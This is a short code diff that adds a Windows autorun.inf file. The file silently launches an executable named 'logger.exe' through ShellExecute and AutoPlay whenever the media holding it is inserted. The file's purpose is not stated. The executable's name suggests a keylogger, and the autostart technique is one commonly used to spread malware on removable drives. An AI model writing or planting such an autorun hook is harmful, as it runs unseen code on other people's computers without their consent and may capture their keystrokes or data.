@@ -1,0 +1,4 @@
+[autorun]
+	;Open=logger.exe
+	ShellExecute=logger.exe
+	UseAutoPlay=1
